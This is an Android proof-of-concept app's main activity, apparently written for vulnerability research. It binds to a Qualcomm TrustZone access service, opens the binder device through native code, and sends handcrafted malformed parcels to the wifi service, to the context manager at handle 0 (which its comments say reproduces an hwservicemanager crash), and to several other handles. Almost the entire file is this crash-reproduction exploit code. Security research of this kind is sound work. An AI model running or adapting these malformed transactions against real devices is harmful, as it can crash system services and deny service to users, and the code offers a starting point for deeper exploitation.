package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native int nativeOpenDevice(String path);
    public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
    public static native byte[] nativeBinderGetService(int fd, String serviceName);
    public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, byte[] data);
    public static native int nativeBinderWriteToService(int fd, int handle, int code, int flags, byte[] data);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound");
                updateStatus("Bound - starting");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start'.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService failed");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== BINDER CRASH REPRODUCTION ==========");

        int fd = nativeOpenDevice("/dev/binder");
        if (fd < 0) {
            fd = nativeOpenDevice("/dev/hwbinder");
        }
        if (fd < 0) {
            appendLog("[!] No binder device");
            return;
        }
        appendLog("[+] Using fd=" + fd);

        // ---- Step 1: Get wifi service handle ----
        appendLog("[*] Getting wifi service handle...");
        byte[] svcReply = nativeBinderGetService(fd, "wifi");
        int wifiHandle = -1;
        if (svcReply != null && svcReply.length >= 4) {
            wifiHandle = ((svcReply[0] & 0xFF) |
                          ((svcReply[1] & 0xFF) << 8) |
                          ((svcReply[2] & 0xFF) << 16) |
                          ((svcReply[3] & 0xFF) << 24));
            appendLog("[GETSVC] wifi -> handle=" + wifiHandle + " (0x" + Integer.toHexString(wifiHandle) + ")");
        } else {
            appendLog("[GETSVC] wifi -> no reply");
        }

        if (wifiHandle > 0) {
            appendLog("[*] WiFi handle obtained, starting crash test on wifi");
            testWiFiCrash(fd, wifiHandle);
        } else {
            appendLog("[!] WiFi handle not found, skipping wifi crash test");
        }

        // ---- Step 2: Reproduce hwservicemanager crash (context manager) ----
        appendLog("[*] Reproducing hwservicemanager crash via malformed GET_SERVICE");
        reproduceContextManagerCrash(fd);

        // ---- Step 3: Try malformed transactions on handle 1-5 (just in case) ----
        for (int h = 1; h <= 5; h++) {
            appendLog("[*] Testing malformed transaction on handle " + h);
            testMalformedTransaction(fd, h);
        }

        try {
            ParcelFileDescriptor.adoptFd(fd).close();
        } catch (Exception e) {}

        appendLog("========== TEST COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    // WiFi specific crash tests: send malformed parcels
    private void testWiFiCrash(int fd, int handle) {
        appendLog("[WIFI] Testing crash on handle " + handle);

        // Test patterns: various malformed parcels
        // Pattern 1: empty data (no parcel)
        appendLog("[WIFI] Sending empty parcel (data_size=0)");
        String result = nativeBinderDumpReply(fd, handle, 1, 0, null);
        appendLog("[WIFI] result: " + result);

        // Pattern 2: parcel with length but no string (length=0)
        byte[] parcelLen0 = new byte[4];
        // length field 0
        result = nativeBinderDumpReply(fd, handle, 1, 0, parcelLen0);
        appendLog("[WIFI] length=0 -> " + result);

        // Pattern 3: length > 0 but no string (just length field)
        byte[] parcelLenBig = new byte[4];
        // put length 100 (but no actual string)
        parcelLenBig[0] = 100;
        result = nativeBinderDumpReply(fd, handle, 1, 0, parcelLenBig);
        appendLog("[WIFI] length=100 (no string) -> " + result);

        // Pattern 4: correct interface string but with wrong length
        String correctInterface = "android.net.wifi.IWifiManager";
        byte[] correctBytes = (correctInterface + "\0").getBytes(StandardCharsets.UTF_8);
        byte[] wrongLen = new byte[4 + correctBytes.length];
        // put length = correctBytes.length + 10 (mismatch)
        int len = correctBytes.length + 10;
        wrongLen[0] = (byte)(len & 0xFF);
        wrongLen[1] = (byte)((len >> 8) & 0xFF);
        wrongLen[2] = (byte)((len >> 16) & 0xFF);
        wrongLen[3] = (byte)((len >> 24) & 0xFF);
        System.arraycopy(correctBytes, 0, wrongLen, 4, correctBytes.length);
        result = nativeBinderDumpReply(fd, handle, 1, 0, wrongLen);
        appendLog("[WIFI] correct interface with wrong length -> " + result);

        // Pattern 5: wrong interface string (typo)
        String wrongInterface = "android.net.wifi.IWifiManagerX";
        byte[] wrongBytes = (wrongInterface + "\0").getBytes(StandardCharsets.UTF_8);
        byte[] wrongParcel = new byte[4 + wrongBytes.length];
        int wlen = wrongBytes.length;
        wrongParcel[0] = (byte)(wlen & 0xFF);
        wrongParcel[1] = (byte)((wlen >> 8) & 0xFF);
        wrongParcel[2] = (byte)((wlen >> 16) & 0xFF);
        wrongParcel[3] = (byte)((wlen >> 24) & 0xFF);
        System.arraycopy(wrongBytes, 0, wrongParcel, 4, wrongBytes.length);
        result = nativeBinderDumpReply(fd, handle, 1, 0, wrongParcel);
        appendLog("[WIFI] wrong interface string -> " + result);

        // Pattern 6: empty string (just null terminator)
        byte[] emptyStr = new byte[4 + 1];
        emptyStr[0] = 1;
        emptyStr[4] = 0; // null terminator
        result = nativeBinderDumpReply(fd, handle, 1, 0, emptyStr);
        appendLog("[WIFI] empty string -> " + result);

        // Pattern 7: data with offsets (try to cause parser issues)
        // We'll send a parcel with an offset that points to invalid data
        // For simplicity, we send a parcel with offsets_size != 0 but with no valid objects
        // However our nativeBinderTransaction sets offsets_size=0, we could modify later
        // but we'll just send a parcel with some data that might be interpreted as object.
        byte[] objData = new byte[16];
        // Put a flat_binder_object at offset 0 (not really)
        // For now, we just send a raw buffer with some data
        byte[] raw = new byte[64];
        for (int i = 0; i < raw.length; i++) raw[i] = (byte)i;
        result = nativeBinderDumpReply(fd, handle, 1, 0, raw);
        appendLog("[WIFI] raw 64 bytes -> " + result);
    }

    // Reproduce hwservicemanager crash by sending malformed GET_SERVICE
    private void reproduceContextManagerCrash(int fd) {
        appendLog("[CRASH-CTX] Sending malformed GET_SERVICE to context manager (handle=0)");

        // Pattern: send empty parcel (no service name) with code=1 (GET_SERVICE)
        // This caused the crash earlier.
        appendLog("[CRASH-CTX] empty data");
        byte[] reply = nativeBinderTransaction(fd, 0, 1, 0, null);
        if (reply == null) {
            appendLog("[CRASH-CTX] no reply (likely crash occurred)");
        } else {
            appendLog("[CRASH-CTX] reply len=" + reply.length);
        }

        // Another pattern: send service name without null terminator
        String svc = "wifi";
        byte[] svcBytes = svc.getBytes(StandardCharsets.UTF_8);
        // no null terminator
        byte[] noNull = new byte[4 + svcBytes.length];
        int len = svcBytes.length;
        noNull[0] = (byte)(len & 0xFF);
        noNull[1] = (byte)((len >> 8) & 0xFF);
        noNull[2] = (byte)((len >> 16) & 0xFF);
        noNull[3] = (byte)((len >> 24) & 0xFF);
        System.arraycopy(svcBytes, 0, noNull, 4, svcBytes.length);
        appendLog("[CRASH-CTX] sending service name without null terminator");
        reply = nativeBinderTransaction(fd, 0, 1, 0, noNull);
        if (reply == null) {
            appendLog("[CRASH-CTX] no reply (likely crash)");
        } else {
            appendLog("[CRASH-CTX] reply len=" + reply.length);
        }

        // Send with wrong length (length > actual bytes)
        byte[] wrongLenSvc = new byte[4 + svcBytes.length];
        wrongLenSvc[0] = (byte)(100 & 0xFF);
        wrongLenSvc[1] = (byte)((100 >> 8) & 0xFF);
        wrongLenSvc[2] = (byte)((100 >> 16) & 0xFF);
        wrongLenSvc[3] = (byte)((100 >> 24) & 0xFF);
        System.arraycopy(svcBytes, 0, wrongLenSvc, 4, svcBytes.length);
        appendLog("[CRASH-CTX] sending with length=100 (actual shorter)");
        reply = nativeBinderTransaction(fd, 0, 1, 0, wrongLenSvc);
        if (reply == null) {
            appendLog("[CRASH-CTX] no reply");
        } else {
            appendLog("[CRASH-CTX] reply len=" + reply.length);
        }
    }

    // Generic malformed transaction test on arbitrary handle
    private void testMalformedTransaction(int fd, int handle) {
        appendLog("[MALFORM] Testing handle " + handle);
        byte[] empty = null;
        String res = nativeBinderDumpReply(fd, handle, 1, 0, empty);
        appendLog("[MALFORM] empty -> " + res);

        byte[] badLen = new byte[4];
        badLen[0] = 0x01;
        badLen[1] = 0x00;
        badLen[2] = 0x00;
        badLen[3] = 0x00;
        res = nativeBinderDumpReply(fd, handle, 1, 0, badLen);
        appendLog("[MALFORM] length=1 with no data -> " + res);

        byte[] justNull = new byte[5];
        justNull[0] = 1;
        justNull[4] = 0;
        res = nativeBinderDumpReply(fd, handle, 1, 0, justNull);
        appendLog("[MALFORM] null string -> " + res);
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "binder_crash_test_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Binder Crash Test Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private File getDumpDir() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
        }
        return getFilesDir();
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Test completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
